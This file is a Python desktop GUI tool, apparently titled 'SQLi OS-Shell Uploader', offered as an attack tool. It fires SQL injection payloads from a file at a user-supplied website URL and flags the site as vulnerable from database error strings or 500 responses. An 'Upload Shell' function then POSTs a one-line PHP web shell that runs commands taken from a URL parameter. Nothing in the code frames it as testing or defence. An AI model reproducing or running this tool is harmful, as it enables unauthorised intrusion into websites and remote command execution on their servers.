import tkinter as tk
from tkinter import filedialog, messagebox, ttk
import requests
import threading
import sqlite3
import time
import os
from PIL import Image, ImageTk, ImageSequence

class SQLiUploader:
    def __init__(self, root):
        self.root = root
        self.root.title("SQLi OS-Shell Uploader V1.0.0 by Retr0")
        self.root.geometry("600x500")

        self.url = tk.StringVar()
        self.scan_paused = False
        self.is_scanning = False
        self.payloads = []
        self.scan_thread = None
        self.stop_animation = threading.Event()
        self.stop_scan = threading.Event()  # Stop event for stopping the scan
        self.total_payloads = 0  # Total number of payloads

        # Placeholder text
        self.placeholder_text = "https://www.site.com/index.php?id="
        self.url.set(self.placeholder_text)

        # UI elements
        self.create_widgets()

        # Load payloads
        self.load_payloads()

    def create_widgets(self):
        tk.Label(self.root, text="Enter URL:").pack(pady=10)
        self.url_entry = tk.Entry(self.root, textvariable=self.url, width=60, fg='grey')
        self.url_entry.pack(pady=5)

        # Add focus event to handle placeholder
        self.url_entry.bind("<FocusIn>", self.clear_placeholder)
        self.url_entry.bind("<FocusOut>", self.add_placeholder)

        # Create a frame to hold the buttons in two lines
        button_frame1 = tk.Frame(self.root)
        button_frame1.pack(pady=10)

        button_frame2 = tk.Frame(self.root)
        button_frame2.pack(pady=5)

        # First line buttons
        self.scan_button = tk.Button(button_frame1, text="Scan", command=self.start_scan)
        self.scan_button.pack(side=tk.LEFT, padx=7)

        self.upload_button = tk.Button(button_frame1, text="Upload Shell", command=self.upload_shell, state=tk.DISABLED)
        self.upload_button.pack(side=tk.LEFT, padx=7)

        self.pause_button = tk.Button(button_frame1, text="Pause", command=self.pause_scan, state=tk.DISABLED)
        self.pause_button.pack(side=tk.LEFT, padx=7)

        self.stop_button = tk.Button(button_frame1, text="Stop", command=self.stop_scan_process, state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT, padx=7)

        # Second line buttons
        self.reset_button = tk.Button(button_frame1, text="Reset", command=self.reset_scan)
        self.reset_button.pack(side=tk.LEFT, padx=7)

        self.save_button = tk.Button(button_frame1, text="Save Result", command=self.save_result, state=tk.DISABLED)
        self.save_button.pack(side=tk.LEFT, padx=7)

        # Dynamic Payload Count Label
        self.payload_count_label = tk.Label(self.root, text="Payload 0/0 Tested", font=('Arial', 10, 'bold'))
        self.payload_count_label.pack(pady=5)

        # Progress Bar
        self.progress = ttk.Progressbar(self.root, length=565, mode='determinate')
        self.progress.pack(pady=5)

        # Log area
        self.log_text = tk.Text(self.root, height=14, width=70)
        self.log_text.pack(pady=10)

        # Animation (GIF)
        self.animation_label = tk.Label(self.root)
        self.animation_label.pack(pady=5)
        self.load_animation()

    def clear_placeholder(self, event):
        """Clear placeholder text when the user focuses on the entry box."""
        if self.url_entry.get() == self.placeholder_text:
            self.url_entry.delete(0, tk.END)
            self.url_entry.config(fg='black')

    def add_placeholder(self, event):
        """Add placeholder text when the entry box is empty after losing focus."""
        if self.url_entry.get() == "":
            self.url_entry.insert(0, self.placeholder_text)
            self.url_entry.config(fg='grey')

    def load_payloads(self):
        """Load SQLi payloads from an external file."""
        if os.path.exists('sqli.txt'):
            with open('sqli.txt', 'r') as f:
                self.payloads = f.readlines()
            self.total_payloads = len(self.payloads)  # Store total payloads
            self.log(f"Loaded payloads from sqli.txt. Total payloads: {self.total_payloads}.")
        else:
            self.log("Payload file sqli.txt not found!")

    def log(self, message):
        """Log messages to the text box and error log file."""
        self.log_text.insert(tk.END, message + '\n')
        self.log_text.see(tk.END)
        with open('error.log', 'a') as log_file:
            log_file.write(message + '\n')

    def load_animation(self):
        """Load the GIF animation for scanning."""
        try:
            self.loading_gif = Image.open('loading.gif')
            self.frames = [ImageTk.PhotoImage(frame.copy()) for frame in ImageSequence.Iterator(self.loading_gif)]
        except Exception as e:
            self.log(f"Error loading animation: {str(e)}")

    def start_scan(self):
        """Start the scanning process in a new thread."""
        self.is_scanning = True
        self.scan_button.config(state=tk.DISABLED)
        self.upload_button.config(state=tk.DISABLED)
        self.pause_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.NORMAL)
        self.reset_button.config(state=tk.DISABLED)
        self.progress.config(value=0)
        self.stop_animation.clear()
        self.stop_scan.clear()  # Clear stop event before starting scan

        # Start scan in a new thread
        self.scan_thread = threading.Thread(target=self.scan_url)
        self.scan_thread.start()

        # Start animation in a new thread
        threading.Thread(target=self.animate_scan).start()

    def animate_scan(self):
        """Play the animation while scanning."""
        frame_index = 0
        while self.is_scanning and not self.stop_animation.is_set():
            self.animation_label.config(image=self.frames[frame_index])
            frame_index = (frame_index + 1) % len(self.frames)
            time.sleep(0.1)  # Adjust frame speed

        self.animation_label.config(image="")  # Clear image after scanning

    def scan_url(self):
        """Scan the URL with SQLi payloads, handling threading for database connections."""
        url = self.url.get()
        if not url or url == self.placeholder_text:
            self.log("Please enter a valid URL.")
            self.scan_button.config(state=tk.NORMAL)
            return

        if self.total_payloads == 0:
            self.log("No payloads loaded. Aborting scan.")
            return

        # Create a new SQLite connection for this thread
        conn = sqlite3.connect('results.db', check_same_thread=False)
        cursor = conn.cursor()

        try:
            cursor.execute('''CREATE TABLE IF NOT EXISTS results (
                                id INTEGER PRIMARY KEY AUTOINCREMENT,
                                url TEXT,
                                payload TEXT,
                                response TEXT
                              )''')

            for i, payload in enumerate(self.payloads):
                if self.scan_paused:
                    self.log("Scan paused.")
                    return

                if self.stop_scan.is_set():  # Stop the scan if stop event is set
                    self.log("Scan stopped.")
                    break

                try:
                    full_url = url + payload.strip()
                    response = requests.get(full_url)
                    
                    # Update payload count
                    self.payload_count_label.config(text=f"Payload {i + 1}/{self.total_payloads} Tested")

                    # Only log and save vulnerable URLs
                    if self.is_vulnerable(response):
                        self.log(f"Vulnerable URL: {full_url} with payload: {payload.strip()}")
                        # Store result in the database
                        cursor.execute('INSERT INTO results (url, payload, response) VALUES (?, ?, ?)',
                                       (url, payload.strip(), response.text[:100]))
                        conn.commit()

                    # Update progress
                    self.progress.config(value=((i + 1) / self.total_payloads) * 100)
                    time.sleep(0.5)  # Simulating scan delay

                except Exception as e:
                    self.log(f"Error: {str(e)}")

        except Exception as e:
            self.log(f"Database error: {str(e)}")
        finally:
            conn.close()

        self.is_scanning = False
        self.stop_animation.set()
        self.scan_button.config(state=tk.NORMAL)
        self.upload_button.config(state=tk.NORMAL)
        self.save_button.config(state=tk.NORMAL)
        self.pause_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.DISABLED)
        self.reset_button.config(state=tk.NORMAL)
        self.log("Scan completed.")

    def is_vulnerable(self, response):
        """Check if the response indicates a SQLi vulnerability."""
        vulnerable_patterns = [
            "you have an error in your SQL syntax",  # MySQL
            "warning: mysql",  # MySQL
            "unclosed quotation mark after the character string",  # SQL Server
            "quoted string not properly terminated",  # Oracle
            "syntax error",  # General SQL errors
            "internal server error",  # Server errors could indicate a crash
            "database error"  # General database error pattern
        ]

        # Check for specific status codes (like 500) or vulnerable patterns
        if response.status_code == 500 or any(pattern.lower() in response.text.lower() for pattern in vulnerable_patterns):
            return True
        return False

    def upload_shell(self):
        """Upload a shell to the target URL."""
        shell_content = "<?php echo shell_exec($_GET['cmd']); ?>"
        url = self.url.get()

        try:
            response = requests.post(url + "shell.php", data=shell_content)
            if response.status_code == 200:
                self.log("Shell uploaded successfully!")
            else:
                self.log(f"Failed to upload shell: {response.status_code}")
        except Exception as e:
            self.log(f"Error during shell upload: {str(e)}")

    def pause_scan(self):
        """Pause or resume the scanning process."""
        self.scan_paused = not self.scan_paused
        self.pause_button.config(text="Resume" if self.scan_paused else "Pause")
        self.log("Scan paused." if self.scan_paused else "Scan resumed.")

    def reset_scan(self):
        """Reset the UI and clear log."""
        self.url.set(self.placeholder_text)
        self.url_entry.config(fg='grey')  # Set color back to grey
        self.progress.config(value=0)
        self.log_text.delete(1.0, tk.END)
        self.log("Reset complete.")
        self.scan_button.config(state=tk.NORMAL)
        self.upload_button.config(state=tk.DISABLED)
        self.pause_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.DISABLED)
        self.save_button.config(state=tk.DISABLED)

    def save_result(self):
        """Save the scan results to a file."""
        file_path = filedialog.asksaveasfilename(defaultextension=".txt",
                                                 filetypes=[("Text files", "*.txt"),
                                                            ("All files", "*.*")])
        if file_path:
            try:
                conn = sqlite3.connect('results.db', check_same_thread=False)
                cursor = conn.cursor()
                cursor.execute("SELECT url, payload, response FROM results")
                results = cursor.fetchall()
                with open(file_path, 'w') as file:
                    for result in results:
                        file.write(f"URL: {result[0]}, Payload: {result[1]}, Response: {result[2][:100]}...\n")
                self.log(f"Results saved to {file_path}.")
                conn.close()
            except Exception as e:
                self.log(f"Error saving results: {str(e)}")

    def stop_scan_process(self):
        """Stop the scanning process."""
        self.stop_scan.set()  # Set the stop event
        self.log("Stopping scan...")

if __name__ == "__main__":
    root = tk.Tk()
    app = SQLiUploader(root)
    root.mainloop()
